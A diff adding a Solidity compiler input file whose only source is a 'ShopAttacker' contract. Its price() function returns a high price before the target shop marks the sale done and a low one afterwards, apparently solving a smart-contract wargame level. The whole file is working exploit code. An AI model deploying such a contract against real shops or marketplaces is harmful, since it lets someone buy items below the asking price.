@@ -1,0 +1,36 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/ShopAttacker.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IShop {\n    function isSold() external view returns (bool);\n    function buy() external;\n}\n\n\ncontract ShopAttacker {\n    address public owner;\n    IShop public target;\n    \n\n    constructor(address _shopAddress){\n        owner = msg.sender;\n        target = IShop(_shopAddress);\n    }\n\n    modifier onlyOwner {\n    require(msg.sender == owner);\n    _;\n    }\n\n\n    function price() external view returns (uint256){\n        if(!target.isSold()){\n            return 100;\n        } else {\n            return 1;\n        }\n    }\n\n    function attack() public onlyOwner{\n        target.buy();\n    }\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "evmVersion": "paris",
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
